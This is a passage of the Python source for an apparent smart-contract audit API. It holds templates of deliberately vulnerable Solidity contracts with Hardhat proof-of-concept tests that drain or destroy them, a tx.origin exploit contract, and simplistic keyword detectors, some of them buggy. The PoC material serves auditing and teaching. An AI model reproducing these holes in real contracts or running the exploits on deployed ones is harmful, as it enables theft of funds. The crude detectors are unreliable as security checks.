    // Bank was drained via reentrancy
    expect(after).to.be.lessThan(before);
    console.log("Bank balance before: %%s ETH", ethers.formatEther(before));
    console.log("Bank balance after:  %%s ETH", ethers.formatEther(after));
    console.log("Reentrancy count: %%d", await hack.count());
  });
});"""
    },
    "access control": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// VULNERABLE CONTRACT — for PoC testing only
contract VulnerableBank {
    address public owner;
    constructor() { owner = msg.sender; }
    // @audit — no access control!
    function withdrawAll() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    function deposit() external payable {}
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Access Control PoC", function () {
  it("should let anyone drain funds", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const Bank = await ethers.getContractFactory("VulnerableBank");
    const bank = await Bank.deploy();
    await bank.waitForDeployment();
    const bankAddr = await bank.getAddress();

    await owner.sendTransaction({ to: bankAddr, value: ethers.parseEther("5") });

    const before = await ethers.provider.getBalance(bankAddr);
    await bank.connect(attacker).withdrawAll();
    const after = await ethers.provider.getBalance(bankAddr);

    expect(after).to.equal(0);
    console.log("Attacker drained the contract. Balance before: %%s ETH, after: %%s ETH",
      ethers.formatEther(before), ethers.formatEther(after));
  });
});"""
    },
    "overflow": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
// VULNERABLE CONTRACT — for PoC testing only
contract VulnerableToken {
    mapping(address => uint) public balances;
    function transfer(address to, uint amount) external {
        // @audit — unchecked underflow
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
    function mint(address to, uint amount) external { balances[to] += amount; }
    function balanceOf(address a) external view returns (uint) { return balances[a]; }
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Overflow PoC", function () {
  it("should underflow balance to huge number", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const Token = await ethers.getContractFactory("VulnerableToken");
    const token = await Token.deploy();
    await token.waitForDeployment();

    // Owner has 0 tokens, tries to transfer 1 → underflow
    await expect(
      token.connect(owner).transfer(attacker.address, 1)
    ).to.not.be.reverted;

    const bal = await token.balanceOf(owner.address);
    expect(bal).to.equal(ethers.MaxUint256);
    console.log("Owner balance after underflow: %%s", bal);
  });
});"""
    },
    "tx.origin": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// VULNERABLE CONTRACT — for PoC testing only
contract VulnerableWallet {
    address public owner;
    constructor() { owner = msg.sender; }
    // @audit — uses tx.origin instead of msg.sender
    function withdrawAll() external {
        require(tx.origin == owner);
        payable(msg.sender).transfer(address(this).balance);
    }
    function deposit() external payable {}
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("tx.origin PoC", function () {
  it("should bypass auth via intermediary contract", async function () {
    const [victim, attacker] = await ethers.getSigners();
    const Wallet = await ethers.getContractFactory("VulnerableWallet");
    const wallet = await Wallet.connect(victim).deploy();
    await wallet.waitForDeployment();
    const walletAddr = await wallet.getAddress();

    await victim.sendTransaction({ to: walletAddr, value: ethers.parseEther("5") });

    // Intermediary contract calls withdrawAll — tx.origin is attacker, msg.sender is intermediary
    const Intermediary = await ethers.getContractFactory("TxOriginExploit");
    const mid = await Intermediary.deploy();
    await mid.waitForDeployment();

    await mid.connect(attacker).exploit(walletAddr);
    const bal = await ethers.provider.getBalance(walletAddr);
    expect(bal).to.equal(0);
    console.log("Wallet drained via tx.origin bypass");
  });
});""",
        "extra_contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract TxOriginExploit {
    function exploit(address target) external {
        (bool ok,) = target.call(abi.encodeWithSignature("withdrawAll()"));
        require(ok);
    }
}"""
    },
    "unchecked call": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// VULNERABLE CONTRACT — for PoC testing only
contract VulnerableExecutor {
    function execute(address target, bytes calldata data) external {
        // @audit — return value not checked
        target.call(data);
    }
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Unchecked Call PoC", function () {
  it("silent failure when target reverts", async function () {
    const Exec = await ethers.getContractFactory("VulnerableExecutor");
    const exec = await Exec.deploy();
    await exec.waitForDeployment();

    // Call a non-existent contract — should revert, but doesn't because unchecked
    const tx = await exec.execute(
      "0x0000000000000000000000000000000000000001",
      "0xdeadbeef"
    );
    const receipt = await tx.wait();
    expect(receipt.status).to.equal(1); // tx still succeeds!
    console.log("Unchecked call: tx succeeded despite failed subcall");
  });
});"""
    },
    "selfdestruct": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// VULNERABLE CONTRACT — for PoC testing only
contract VulnerableContract {
    // @audit — anyone can selfdestruct
    function kill() external {
        selfdestruct(payable(msg.sender));
    }
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Selfdestruct PoC", function () {
  it("should destroy the contract", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const Target = await ethers.getContractFactory("VulnerableContract");
    const target = await Target.deploy();
    await target.waitForDeployment();
    const targetAddr = await target.getAddress();

    await target.connect(attacker).kill();

    const code = await ethers.provider.getCode(targetAddr);
    expect(code).to.equal("0x");
    console.log("Contract destroyed by anyone via selfdestruct");
  });
});"""
    },
    "delegatecall": {
        "contract": """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// VULNERABLE CONTRACT — for PoC testing only
contract StorageSlot {
    address public owner;
    uint public value;
}
contract Library {
    address public owner;
    function setOwner(address _owner) external { owner = _owner; }
}
contract VulnerableProxy is StorageSlot {
    // @audit — unsafe delegatecall, storage collision
    function delegate(address lib, bytes calldata data) external {
        (bool ok,) = lib.delegatecall(data);
        require(ok);
    }
}""",
        "test": """const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Delegatecall PoC", function () {
  it("should overwrite owner storage slot", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const Lib = await ethers.getContractFactory("Library");
    const lib = await Lib.deploy();
    await lib.waitForDeployment();

    const Proxy = await ethers.getContractFactory("VulnerableProxy");
    const proxy = await Proxy.deploy();
    await proxy.waitForDeployment();
    const proxyAddr = await proxy.getAddress();

    // Delegatecall to Library.setOwner — overwrites proxy's storage slot 0
    const data = lib.interface.encodeFunctionData("setOwner", [attacker.address]);
    await proxy.delegate(await lib.getAddress(), data);

    const newOwner = await proxy.owner();
    expect(newOwner).to.equal(attacker.address);
    console.log("Proxy owner overwritten via delegatecall: %%s", newOwner);
  });
});"""
    },
}


def generate_poc_exploit(vuln: dict, target: str) -> dict:
    t = vuln.get("type", "").lower()
    for key, template in POC_TEMPLATES.items():
        if key in t:
            return {
                "vulnerable_contract": template["contract"],
                "hardhat_test": template["test"],
                "extra_contracts": [template.get("extra_contract", "")] if template.get("extra_contract") else [],
            }
    return {
        "vulnerable_contract": f"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\ncontract Target {{ string public vulnType = \"{vuln.get('type', 'Unknown')}\"; }}",
        "hardhat_test": f"""const {{ ethers }} = require("hardhat");
const {{ expect }} = require("chai");
describe("PoC: {vuln.get('type', 'Unknown')}", function () {{
  it("should demonstrate the vulnerability", async function () {{
    console.log("Manual proof-of-concept needed for: {vuln.get('type', 'Unknown')}");
    console.log("Description: {vuln.get('description', '')}");
  }});
}});""",
        "extra_contracts": [],
    }


@app.get("/api/export/markdown/{task_id}")
async def export_markdown(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    return PlainTextResponse(content=generate_markdown_report(task.get("result", {})), media_type="text/markdown")


@app.get("/api/export/pdf/{task_id}")
async def export_pdf(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    result = task.get("result", {})
    lines = [f"Solidify Security Audit Report\n{'='*40}\nScore: {result.get('score', 'N/A')}/10\nVulnerabilities: {len(result.get('vulnerabilities', []))}\n\nSummary:\n{result.get('summary', '')}\n"]
    for v in result.get("vulnerabilities", []):
        lines.append(f"\n[{v.get('severity', 'INFO')}] {v.get('type', 'Unknown')}\n  Location: {v.get('location', 'N/A')}\n  CVSS: {v.get('cvss', 'N/A')}\n  Description: {v.get('description', '')}\n  Fix: {v.get('recommendation', 'N/A')}")
    return PlainTextResponse(content="".join(lines), media_type="text/plain; charset=utf-8",
                              headers={"Content-Disposition": f"attachment; filename=audit-{task_id}.txt"})


@app.get("/api/poc/{task_id}")
async def get_poc(task_id: str):
    if task_id not in audit_tasks:
        raise HTTPException(status_code=404, detail="Task not found")
    task = audit_tasks[task_id]
    if task.get("status") != "completed":
        return {"error": "Audit not completed"}
    result = task.get("result", {})
    target = task.get("input", "TargetContract")
    pocs = []
    for v in result.get("vulnerabilities", []):
        if v.get("severity") in ("CRITICAL", "HIGH"):
            poc = generate_poc_exploit(v, target)
            pocs.append({
                "vulnerability": v.get("type"),
                "severity": v.get("severity"),
                "hardhat_test": poc["hardhat_test"],
                "vulnerable_contract": poc["vulnerable_contract"],
                "extra_contracts": poc["extra_contracts"],
            })
    return {"pocs": pocs}


@app.post("/api/detect/gas")
async def detect_gas(code: str = Body(..., embed=True)):
    if not code or len(code) > MAX_CODE_SIZE:
        raise HTTPException(status_code=400, detail="Invalid code")
    issues = []
    lines = code.split("\n")
    storage_reads = [i + 1 for i, line in enumerate(lines) if ".balance" in line and "storage" not in line]
    if len(storage_reads) > 1:
        issues.append({"type": "Multiple Storage Reads", "location": f"Lines {storage_reads[:3]}",
                        "issue": f"Reading storage {len(storage_reads)} times",
                        "recommendation": "Cache in local variable", "savings": f"~{2100 * (len(storage_reads) - 1)} gas"})
    for i, line in enumerate(lines):
        if "for" in line and "length" in line and "i++" in line:
            issues.append({"type": "Unbounded Loop", "location": f"Line {i + 1}",
                            "issue": "Dynamic loop without gas check",
                            "recommendation": "Check gasleft() inside loop", "savings": "Prevents OOG revert"})
    if code.count(".balance") > 2:
        issues.append({"type": "Repeated SLOAD", "location": ".balance access",
                        "issue": "Multiple storage reads for same variable",
                        "recommendation": "Use local variable", "savings": "~2100 gas each"})
    return {"optimizations": issues}


@app.post("/api/detect/frontrun")
async def detect_frontrun(code: str = Body(..., embed=True)):
    if not code or len(code) > MAX_CODE_SIZE:
        raise HTTPException(status_code=400, detail="Invalid code")
    issues = []
    cl = code.lower()
    if ("swap" in cl or "exchange" in cl) and "minAmount" not in cl and "slippage" not in cl:
        issues.append({"type": "No Slippage Protection", "location": "swap function",
                        "issue": "Swap can be sandwiched for profit",
                        "recommendation": "Add minimum amount out check", "severity": "HIGH"})
    if "uint256(-1)" in code or "type(uint256).max" in code:
        issues.append({"type": "Unlimited Token Approval", "location": "approve",
                        "issue": "Infinite approval allows draining tokens",
                        "recommendation": "Set specific allowance", "severity": "MEDIUM"})
    if not any(kw in cl for kw in ["onlyowner", "onlyowner()", "msg.sender == owner", "msg.sender == address(this)", "auth"]):
        if ("withdraw" in cl or "transfer" in cl) and "constructor" not in cl:
            issues.append({"type": "Missing Access Control", "location": "withdraw/transfer",
                            "issue": "No owner modifier on critical function",
                            "recommendation": "Add onlyOwner modifier", "severity": "MEDIUM"})
    return {"vulnerabilities": issues}


@app.post("/api/detect/oracle")
async def detect_oracle(code: str = Body(..., embed=True)):
    if not code or len(code) > MAX_CODE_SIZE:
        raise HTTPException(status_code=400, detail="Invalid code")
    issues = []
    for pattern, desc in [("block.timestamp", "Block timestamp can be manipulated by miner"),
                           ("block.blockhash", "Block hash is not unpredictable"),
                           ("now", "now() is deprecated and manipulable")]:
        if pattern in code:
            issues.append({"type": "On-Chain Price Oracle", "location": pattern, "issue": desc,
                            "recommendation": "Use Chainlink price feed",
                            "severity": "HIGH" if "price" in desc else "MEDIUM"})
    if "blockhash" in code and "random" in code.lower():
        issues.append({"type": "Predictable Randomness", "location": "blockhash",
                        "issue": "Miner can predict randomness",
                        "recommendation": "Use Chainlink VRF", "severity": "CRITICAL"})
    return {"vulnerabilities": issues}


if __name__ == "__main__":
    import uvicorn
    logger.info("Starting Solidify API on http://localhost:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000, timeout_keep_alive=30)
